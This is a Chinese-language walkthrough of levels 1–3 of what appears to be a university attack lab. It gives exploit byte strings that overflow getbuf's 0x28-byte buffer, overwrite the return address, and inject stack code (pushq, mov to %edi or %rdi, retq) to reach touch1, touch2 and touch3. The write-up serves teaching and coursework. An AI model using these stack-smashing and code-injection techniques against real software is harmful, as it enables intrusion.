* LEVEL1
  * PREQUEST
    1. 本关不需要注入任何新的代码，我们只用保证程序能执行到指定的为止即可
    2. 检查 <test> 函数其语义可大致使用以下代码表示(并不属于完整片段):

       void test() {
         int val;
         val = getbuf();
         printf("No exploit.  Getbuf returned 0x%x\n", val);
       }
        
      本关要求，在 getbuf 返回前能够执行到 <touch1> 函数，而不是打印接下来的 printf
  * SOLVE
    1. see [./ctarget_dump_d] 可知 <touch1> 函数所在地址为 0x4017c0
    2. 既然要求在返 <getbuf> 不能返回原先所在的语义，那么就要求，所输入的字符串需要造成 [buffer overflow] 导致 call 所保存的上一个
    栈帧中的返回地址被破坏，从而使 <getbuf> 执行 ret 指令时会跳转到我们目标的攻击函数中
    3. 查看 <getbuf> 函数逆向实现可知(0x4017a8)，编译期为当前栈帧分配了 0x28 字节，并且这 0x28 字节都为 <Gets> 目标缓冲区所使用，得
    出结论: 我们的攻击字符串需要先向上滑动 0x28 字节，然后再填入目标地址，即: 

      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      c0 17 40 00 00 00 00 00

    4. 这里我们要注意下大小端字节序的问题，see: c0 17 40 00 00 00 00 00
    5. 查看结果: 
      unix> ./hex2rax < exploit.txt > exploit.out
      gdb> r -q < expolit.out


* LEVEL2
  * PREQUEST
    1. 不要使用任何 jmp 或者 call 指令，因为指令要求的目的地址是很难指定的，在这里我们使用 ret 指
    令来代替任意传输的控制的请求
    2. 查看 ./attacklab.pdf/Appendix B 部分去学习如何生成指令的二进制表示以方便接下来的工作

  * SOLVE:
    1. 本关和 LEVE1 一致，要求指令 <getbuf> 函数返回 test 语义前能够跳转至 <touch2>，并且在 <touch2> 中
    需要正确打印出 Touch2!: You called touch2 的实现
    2. 查看 <touch2> 函数上下文，发现打印出上述要求需要寄存器 edi 和 ../cookie.txt 中所保存的值相等才可
    以，但是在 <touch2> 上一个栈帧中(假定为 <getbuf>) 并无显著修改该寄存器的指令，故在这里，需要我们自己
    注意一部分代码以实现这一要求
    3. 由于 ctarget 的特殊性，使得栈上的代码都为可执行代码，并且，栈的地址都为强制性分配，即不会出现随机
    地址的情景，故利用这一特性，我们可以在通过缓冲区溢出的时机在栈上注入部分我们的代码，并且在第一次 ret
    时，能够跳转到栈上的这部分可执行指令中，它对应的编码为:

      68 ec 17 40 00 bf fa 97 
      b9 59 c3 00 00 00 00 00
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      78 dc 61 55 00 00 00 00

    观察最后一段编码: 0x5561dc78，其实它就是第一次 ret 需要跳转到的地址，其实也就对应着第一段编码，第一段
    编码可以翻译为:

      68 ec 17 40 00 bf fa 97 b9 59 c3

    它具体对应的指令为:

      0:   68 ec 17 40 00          pushq  $0x4017ec
      5:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
      a:   c3                      retq

    我们可以看到，该指令在栈上压入了 <touch2> 的目标地址，并设置了 %edi 寄存器为 ../cookie.txt 中所保存的值，
    最后再通过 ret 指令以读取当前 rsp 指针中所保存的元素并跳转至此处，以完成 <touch2> 的攻击
    


* LEVEL3
  * PREQUEST:
    1. <heaxmatch>: 

      int hexmatch(unsigned val, char *sval) {
        char cbuf[110];

        /* Make position of check string unpredictable */
        char*s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
      }

    2. <touch3>:
      
      void touch3(char*sval) {
        vlevel = 3;       

        /* Part of validation protocol */
        if (hexmatch(cookie, sval)) {
          printf("Touch3!: You called touch3(\"%s\")\n", sval);
          validate(3);
        } else {
          printf("Misfire: You called touch3(\"%s\")\n", sval);
          fail(3);
        }

        exit(0);
      }

  * SOLVE:
    1. 跳转要求和前面一致，不在阐述
    2. <heaxmatch> 返回正确结果的前提是 sval 设置为和 cookie 等额 ASCII 表示数值的字符串(不带有前缀 0x)
    3. 可通过 [./ctarget_dump_d] 可知，<heaxmatch> 的参数 sval 通过寄存器 %rdi 传输，故我们可以暂且明确
    一个目标，要将 %rdi 设置为指向和 cookie 等额 ASCII 表示数值的字符串指针
    4. 通过 gdb 调试时会发现，<heaxmatch> 会破坏掉原先由 <getbuf> 中所构造的缓冲区，故我们的字符串所指向
    的地址不能在这个范围之内，由此得出: 

      68 fa 18 40 00 48 c7 c7 
      a8 dc 61 55 c3 00 00 00
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00 
      00 00 00 00 00 00 00 00
      78 dc 61 55 00 00 00 00
      35 39 62 39 39 37 66 61  <-- "59b997fa"; 将字符串放在这个位置是为了不然 <heaxmatch> 对其进行破坏;
      00 00 00 00 00 00 00 00

    其中，前两段的代码主要作用就是设置 %rdi 指向上述地址，并且设置 ret 返回为 <touch3>，这个思想和 LEVEL2
    一致



